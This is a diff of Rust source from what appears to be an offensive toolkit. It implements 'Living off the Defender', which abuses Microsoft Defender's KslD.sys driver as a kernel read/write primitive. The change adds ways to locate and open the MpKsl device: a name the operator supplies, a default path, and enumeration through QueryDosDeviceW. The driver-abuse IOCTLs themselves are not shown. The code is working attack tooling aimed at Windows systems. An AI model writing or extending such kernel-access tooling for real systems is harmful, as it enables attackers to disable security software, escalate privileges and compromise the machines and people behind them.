@@ -45,9 +45,9 @@ use crate::{KernelRw, KitError, KrwError};
 ///   `RtlInitUnicodeString(&name, L"\\Device\\MpKsl*")`
 ///   `IoGetDeviceObjectPointer(&name, ...)` → device object
 ///
-/// For our purposes we open `\\.\MpKsl` (Win32 device namespace) and let the
-/// I/O manager resolve the symbolic link. If the device name differs on the
-/// target, the operator supplies the exact name.
+/// On Windows we try `\\.\MpKsl` first; if that fails, we enumerate all
+/// dos-device mappings via `QueryDosDeviceW` to find the real `MpKslXXXX`
+/// device and construct `\\.\Global\MpKslXXXX`.
 pub const KSLD_DEFAULT_DEVICE: &[u16] = &[
     '\\' as u16, '\\' as u16, '.' as u16, '\\' as u16,
     'M' as u16, 'p' as u16, 'K' as u16, 's' as u16, 'l' as u16,
@@ -117,6 +117,79 @@ mod windows_impl {
         unsafe { crate::win::resolve::resolve_sym(module, name) }
     }
 
+    // ---- Dynamic KslD device resolution (C1) ----
+
+    type QueryDosDeviceWFn = unsafe extern "system" fn(
+        lp_device_name: *const u16,
+        lp_target_path: *mut u16,
+        ucch_max: u32,
+    ) -> u32;
+
+    /// MpKsl prefix in UTF-16 for device name matching during enumeration.
+    const MPKSL_PREFIX_U16: [u16; 5] = [
+        'M' as u16, 'p' as u16, 'K' as u16, 's' as u16, 'l' as u16,
+    ];
+
+    /// Win32 device path prefix for the global dos-device namespace.
+    const GLOBAL_PREFIX_U16: &[u16] = &[
+        '\\' as u16, '\\' as u16, '.' as u16, '\\' as u16,
+        'G' as u16, 'l' as u16, 'o' as u16, 'b' as u16, 'a' as u16, 'l' as u16,
+        '\\' as u16,
+    ];
+
+    /// Try to enumerate the KslD device name dynamically via `QueryDosDeviceW`.
+    ///
+    /// `QueryDosDeviceW(NULL, buf, size)` returns all `\Device\` symbolic links
+    /// in the dos-device namespace. We scan for any matching `MpKsl*` prefix and
+    /// return the Win32 path `\\.\Global\MpKslXXXX` for that device.
+    ///
+    /// Returns `None` if no MpKsl device is found (Defender not running / KslD
+    /// not loaded / device name changed beyond recognition).
+    fn enumerate_ksld_device() -> Option<alloc::vec::Vec<u16>> {
+        let qddw: QueryDosDeviceWFn =
+            resolve_sym(b"kernel32.dll", b"QueryDosDeviceW").ok()?;
+
+        // QueryDosDeviceW with NULL device_name returns all dos-device mappings.
+        // Start with 64 KiB; the API double-NUL terminates the list.
+        let mut buf = alloc::vec![0u16; 32768];
+        loop {
+            let len = unsafe { qddw(core::ptr::null(), buf.as_mut_ptr(), buf.len() as u32) };
+            if len == 0 {
+                return None; // API failed
+            }
+            if len as usize >= buf.len() {
+                // Buffer too small — grow and retry.
+                buf.resize(len as usize + 256, 0);
+                continue;
+            }
+            // Parse the double-NUL-terminated list of device names.
+            let names = &buf[..len as usize];
+            let mut start = 0;
+            for (i, &ch) in names.iter().enumerate() {
+                if ch == 0 {
+                    if start < i {
+                        let name = &names[start..i];
+                        // Check if this name matches the MpKsl prefix.
+                        if name.len() >= MPKSL_PREFIX_U16.len()
+                            && name[..5] == MPKSL_PREFIX_U16
+                        {
+                            // Build the Win32 device path: \\.\Global\<name>
+                            let mut path: alloc::vec::Vec<u16> = alloc::vec::Vec::with_capacity(
+                                GLOBAL_PREFIX_U16.len() + name.len() + 1,
+                            );
+                            path.extend_from_slice(GLOBAL_PREFIX_U16);
+                            path.extend_from_slice(name);
+                            path.push(0); // NUL terminator
+                            return Some(path);
+                        }
+                    }
+                    start = i + 1;
+                }
+            }
+            return None; // Exhausted the list without finding MpKsl.
+        }
+    }
+
     // ---- LivingOffDefender: KernelRw over KslD.sys ----
 
     /// "Living off the Defender" — a `KernelRw` impl that uses KslD.sys (a
@@ -155,37 +228,84 @@ mod windows_impl {
             let create_file: CreateFileWFn = resolve_sym(b"kernel32.dll", b"CreateFileW")?;
             let dioctl: DeviceIoControlFn = resolve_sym(b"kernel32.dll", b"DeviceIoControl")?;
 
-            let raw_path = device_name.unwrap_or(KSLD_DEFAULT_DEVICE);
-
-            // Build a NUL-terminated wide string.
-            let mut path_buf: alloc::vec::Vec<u16> = alloc::vec::Vec::with_capacity(raw_path.len() + 1);
-            path_buf.extend_from_slice(raw_path);
-            if *path_buf.last().unwrap_or(&1) != 0 {
-                path_buf.push(0);
-            }
-
-            let h = unsafe {
-                create_file(
-                    path_buf.as_ptr(),
-                    0xC0_00_00_00, // GENERIC_READ | GENERIC_WRITE
-                    0x03,          // FILE_SHARE_READ | FILE_SHARE_WRITE
-                    ptr::null_mut(),
-                    0x03,          // OPEN_EXISTING
-                    0,
-                    ptr::null_mut(),
-                )
+            // Try the operator-supplied name first, then the default, then enumerate.
+            let paths_to_try: alloc::vec::Vec<&[u16]> = {
+                let mut v = alloc::vec::Vec::with_capacity(3);
+                if let Some(name) = device_name {
+                    v.push(name);
+                }
+                v.push(KSLD_DEFAULT_DEVICE);
+                v
             };
 
-            if h as isize == -1 || h.is_null() {
+            let mut h = core::ptr::null_mut();
+            let mut chosen_path: Option<alloc::vec::Vec<u16>> = None;
+
+            for raw_path in &paths_to_try {
+                let mut path_buf: alloc::vec::Vec<u16> =
+                    alloc::vec::Vec::with_capacity(raw_path.len() + 1);
+                path_buf.extend_from_slice(raw_path);
+                if *path_buf.last().unwrap_or(&1) != 0 {
+                    path_buf.push(0);
+                }
+
+                let test_h = unsafe {
+                    create_file(
+                        path_buf.as_ptr(),
+                        0xC0_00_00_00, // GENERIC_READ | GENERIC_WRITE
+                        0x03,          // FILE_SHARE_READ | FILE_SHARE_WRITE
+                        ptr::null_mut(),
+                        0x03,          // OPEN_EXISTING
+                        0,
+                        ptr::null_mut(),
+                    )
+                };
+
+                if test_h as isize != -1 && !test_h.is_null() {
+                    h = test_h;
+                    chosen_path = Some(path_buf);
+                    break;
+                }
+            }
+
+            // If default path failed, try dynamic enumeration via QueryDosDeviceW.
+            if h.is_null() {
+                if let Some(enum_path) = enumerate_ksld_device() {
+                    let test_h = unsafe {
+                        create_file(
+                            enum_path.as_ptr(),
+                            0xC0_00_00_00,
+                            0x03,
+                            ptr::null_mut(),
+                            0x03,
+                            0,
+                            ptr::null_mut(),
+                        )
+                    };
+                    if test_h as isize != -1 && !test_h.is_null() {
+                        h = test_h;
+                        chosen_path = Some(enum_path);
+                    }
+                }
+            }
+
+            if h.is_null() {
                 return Err(KrwError::Other(
-                    alloc::format!("KslD device open failed (is WinDefend / KslD.sys loaded?)"),
+                    alloc::format!(
+                        "KslD device open failed (tried default, operator, and QueryDosDeviceW enumeration). \
+                         Is WinDefend / KslD.sys loaded?"
+                    ),
                 ));
             }
 
             Ok(Self {
                 device: h,
                 dioctl,
-                device_path: path_buf,
+                device_path: chosen_path.unwrap_or_else(|| {
+                    let mut v = alloc::vec::Vec::from(KSLD_DEFAULT_DEVICE);
+                    v.push(0);
+                    v
+                }),
             })
         }
     }
